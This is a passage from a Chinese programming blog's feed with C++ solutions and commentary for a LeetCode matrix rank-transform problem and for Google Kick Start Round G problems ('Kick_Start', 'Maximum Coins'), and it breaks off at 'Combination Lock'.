4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">输入：matrix = [[<span class="number">7</span>,<span class="number">3</span>,<span class="number">6</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">9</span>,<span class="number">8</span>,<span class="number">2</span>]]</span><br><span class="line">输出：[[<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>m == matrix.length</code></li><li><code>n == matrix[i].length</code></li><li><code>1 &lt;= m, n &lt;= 500</code></li><li><code>-109 &lt;= matrix[row][col] &lt;= 109</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/rank-transform-of-a-matrix" target="_blank" rel="noopener">https://leetcode-cn.com/problems/rank-transform-of-a-matrix</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排序 + 并查集</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>这个题目其实庭有意思的，思考差不多一个小时，才把题目本身想明白，确实是个好题目。</li><li>我们很容易看出在矩阵中最小的元素的秩肯定为<code>1</code>,如果本身不涉及到相等元素的处理，题目很简单，当前的<code>rank[i][j] = max(rowRank[i],rowRank[j])</code>.当前元素的秩为它的行秩和列秩的最大值加<code>1</code>即可，比较难的在于如何处理相等的元素。因为题目中要求的相等的元素秩也相等，这是本题最大的<code>corner</code>.</li><li>实际我们可以观察到，如果一个行中存在元素相等，则这两个元素的秩也一定相等，如果一个列中的元素相等，则这两个元素的秩也相等，这就想到我们必须要对行列中相同的元素进行分组，我们首先想到的即为并查集。我们首先将同一行中元素相等索引进行并查集合并，然后同一列中元素相等的索引进行并查集合并。</li><li>我们矩阵中所有元素按照元素的大小进行排序，关键的一点为如果元素相等，我们则按照并查集的<code>fa</code>进行排序，这样我们即可将可能为同样的秩的元素排序在一起。</li><li>我们对矩阵排序的结果进行枚举，每次枚举部分元素满足元素的大小相等且集合的<code>fa</code>也相等，我们可以明确这部分的元素的秩是相等的，则此时我们遍历集合中的元素，找到最大的行秩和列秩，即为<code>maxRankX,maxRankY</code>，此时我们令该枚举子集的秩$rank = max(maxRankX,maxRankY) + 1$即可，同时更新子集中所有的元素的行秩和列秩即可。</li><li>时间复杂度为$O(mn\lgmn)$<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> fa;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    Node(<span class="keyword">int</span> x,<span class="keyword">int</span> fa,<span class="keyword">int</span> val)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;fa = fa;</span><br><span class="line">        <span class="keyword">this</span>-&gt;val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; f, <span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x != f[x]) x = f[x];</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">uni</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; f,<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x1 = find(f,x);</span><br><span class="line">    <span class="keyword">int</span> y1 = find(f,y);</span><br><span class="line">    <span class="keyword">if</span>(x1 == y1) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(x1 &lt; y1) f[y1] = x1;</span><br><span class="line">    <span class="keyword">else</span> f[x1] = y1;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; matrixRankTransform(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        <span class="keyword">int</span> row = matrix.size();</span><br><span class="line">        <span class="keyword">int</span> col = matrix[<span class="number">0</span>].size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;Node&gt; arr;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; f(row*col,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans(row,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(col,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; rowRank(row,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; colRank(col,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*initial fa*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                f[i*col+j] = i*col+j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*select the same cell value with the same colum*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; cntRow;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                cntRow[matrix[i][j]].push_back(i*col+j);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> v : cntRow)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; v.second.size(); ++j)&#123;</span><br><span class="line">                    uni(f,v.second[j<span class="number">-1</span>],v.second[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*select the same cell value with the same row*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; col; ++i)&#123;</span><br><span class="line">            <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; cntCol;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; row; ++j)&#123;</span><br><span class="line">                cntCol[matrix[j][i]].push_back(j*col+i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> v : cntCol)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; v.second.size(); ++j)&#123;</span><br><span class="line">                    uni(f,v.second[j<span class="number">-1</span>],v.second[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*sort array*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                arr.push_back(Node(i*col+j,find(f,i*col+j),matrix[i][j]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*sorted by the value of the cell*/</span></span><br><span class="line">        <span class="keyword">auto</span> cmp = [&amp;](Node &amp; a,Node &amp; b)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a.val == b.val) <span class="keyword">return</span> a.fa &lt; b.fa;</span><br><span class="line">            <span class="keyword">return</span> a.val &lt; b.val;</span><br><span class="line">        &#125;;</span><br><span class="line">        sort(arr.begin(),arr.end(),cmp);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); )&#123;</span><br><span class="line">            <span class="keyword">int</span> fa = arr[i].fa;</span><br><span class="line">            <span class="keyword">int</span> curr = i;</span><br><span class="line">            <span class="keyword">int</span> rankx = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> ranky = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> rank = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(curr &lt; arr.size() &amp;&amp; arr[curr].fa == fa) curr++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; curr; ++j)&#123;</span><br><span class="line">                <span class="keyword">int</span> x = arr[j].x/col;</span><br><span class="line">                <span class="keyword">int</span> y = arr[j].x%col;</span><br><span class="line">                rankx = max(rankx,rowRank[x]);</span><br><span class="line">                ranky = max(ranky,colRank[y]);</span><br><span class="line">            &#125;</span><br><span class="line">            rank = max(rankx,ranky) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; curr; ++j)&#123;</span><br><span class="line">                <span class="keyword">int</span> x = arr[j].x/col;</span><br><span class="line">                <span class="keyword">int</span> y = arr[j].x%col;</span><br><span class="line">                rowRank[x] = rank;</span><br><span class="line">                colRank[y] = rank;</span><br><span class="line">                ans[x][y] = rank;</span><br><span class="line">            &#125;</span><br><span class="line">            i = curr;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-212&quot;&gt;&lt;a href=&quot;#leetcode-contest-212&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 212&quot;&gt;&lt;/a&gt;leetcode  contest 212&lt;/h1&gt;&lt;p&gt;本周的题目质量质量非常不错，特别是第三题和第四题，思考的空间很大。&lt;/p&gt;&lt;h2 id=&quot;5546-按键持续时间最长的键&quot;&gt;&lt;a href=&quot;#5546-按键持续时间最长的键&quot; class=&quot;headerlink&quot; title=&quot;5546. 按键持续时间最长的键&quot;&gt;&lt;/a&gt;5546. 按键持续时间最长的键&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;&lt;code&gt;LeetCode&lt;/code&gt;设计了一款新式键盘，正在测试其可用性。测试人员将会点击一系列键（总计 n 个），每次一个。&lt;/p&gt;&lt;p&gt;给你一个长度为 n 的字符串 &lt;code&gt;keysPressed&lt;/code&gt; ，其中 &lt;code&gt;keysPressed[i]&lt;/code&gt;表示测试序列中第 i 个被按下的键。releaseTimes 是一个升序排列的列表，其中 releaseTimes[i] 表示松开第 i 个键的时间。字符串和数组的 下标都从 0 开始 。第 0 个键在时间为 0 时被按下，接下来每个键都 恰好 在前一个键松开时被按下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Google Kickstart】 Round G</title>
    <link href="http://yoursite.com/2020/10/23/215/"/>
    <id>http://yoursite.com/2020/10/23/215/</id>
    <published>2020-10-23T08:23:20.861Z</published>
    <updated>2020-10-23T08:23:26.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="google-kick-start-round-G"><a href="#google-kick-start-round-G" class="headerlink" title="google  kick start round G"></a>google  kick start round G</h1><p><code>google</code>的<code>kick start</code>质量还是非常高，思考深度比<code>leetcode</code>有意思多了。代码量都不太大，但是很有意思。</p><h2 id="1-Kick-Start"><a href="#1-Kick-Start" class="headerlink" title="1.Kick_Start"></a>1.Kick_Start</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Ksenia is very fond of reading so she kicks off each day by reading a fragment from her favourite book before starting with the rest of her morning routine. A fragment is simply a substring of the text. Ksenia is somewhat superstitious and believes that her day will be lucky if the fragment she reads starts with the string KICK, then goes on with 0 or more characters, and eventually ends with the string START, even if the overall fragment makes little sense.</p><a id="more"></a><p>Given the text of the book, count the number of different lucky fragments that Ksenia can read before the book gets old and she needs to buy another one. Two fragments are considered to be different if they start or end at different positions in the text, even if the fragments read the same. Also note that different lucky fragments may overlap.</p><p><strong>Input</strong><br>The first line of the input gives the number of test cases T. T lines follow, each containing a single string S consisting of upper case English letters only.</p><p><strong>Output</strong><br>For each test case, output one line containing Case #x: y, where x is the test case number (starting from 1) and y is the number of different lucky fragments in the text of this test case.<br>计算字符串的首位分别出现<code>kick</code>和<code>start</code>的个数。</p><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/00000000001a0069/0000000000414bfb" target="_blank" rel="noopener">https://codingcompetitions.withgoogle.com/kickstart/round/00000000001a0069/0000000000414bfb</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 前缀和即可</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>每次保存当前索引处<code>kick</code>的次数<code>curr[i]</code>，每次遇到<code>start</code>叠加当前的<code>curr[i]</code>即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> n = s.size();</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n-i &gt;= <span class="number">4</span> &amp;&amp; s.substr(i,<span class="number">4</span>) == <span class="string">"KICK"</span>)&#123;</span><br><span class="line">            arr.push_back(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n-i &gt;= <span class="number">5</span> &amp;&amp; s.substr(i,<span class="number">5</span>) == <span class="string">"START"</span>)&#123;</span><br><span class="line">            arr.push_back(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; sum(arr.size()+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">        sum[i+<span class="number">1</span>] = sum[i] + arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] == <span class="number">0</span>)&#123;</span><br><span class="line">            ans += sum[arr.size()] - sum[i+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="2-Maximum-Coins"><a href="#2-Maximum-Coins" class="headerlink" title="2. Maximum Coins"></a>2. Maximum Coins</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><strong>Problem</strong><br>Mike has a square matrix with N rows and N columns. Cell (i,j) denotes the cell present at row i and column j. Cell (1,1) denotes the top left corner of the matrix. Each cell has some amount of coins associated with it and Mike can collect them only if he visits that cell. Ci,j represents the number of coins in cell with row i and column j. From a cell (i,j), Mike can decide to go to cell (i+1,j+1) or cell (i-1,j-1), as long as the cell lies within the boundaries of the matrix and has not been visited yet. He can choose to start the journey from any cell and choose to stop at any point. Mike wants to maximize the number of coins he can collect. Please help him determine the maximum number of coins he can collect.</p><p><strong>Input</strong><br>The first line of the input gives the number of test cases, T. T test cases follow. Each test case begins with a line containing the integer N. The next N lines contain N integers each. The j-th integer in the i-th line represents the number of coins Ci,j in cell (i,j).</p><p><strong>Output</strong><br>For each test case, output one line containing Case #x: y, where x is the test case number (starting from 1) and y is the maximum number of coins Mike can collect.</p><p>沿着对角线选择最大对角线的和。</p><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/lexicographically-smallest-string-after-applying-operations" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lexicographically-smallest-string-after-applying-operations</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 暴力</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目竟然会出现在这里，基本上就是<code>easy</code>难度啊，直接计算矩阵所有的对角线的元素和即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">int</span> matrix[<span class="number">1001</span>][<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>, y = i; x &lt; n &amp;&amp; y &lt; n; x++,y++)&#123;</span><br><span class="line">            curr += matrix[x][y];</span><br><span class="line">        &#125;</span><br><span class="line">        ans = max(ans,curr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> x = i, y = <span class="number">0</span>; x &lt; n &amp;&amp; y &lt; n; x++,y++)&#123;</span><br><span class="line">            curr += matrix[x][y];</span><br><span class="line">        &#125;</span><br><span class="line">        ans = max(ans,curr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="3-Combination-Lock"><a href="#3-Combination-Lock" class="headerlink" title="3.Combination Lock"></a>3.Combination Lock</h2><p><strong>Problem</strong><br>A combination lock has W wheels, each of which has the integer 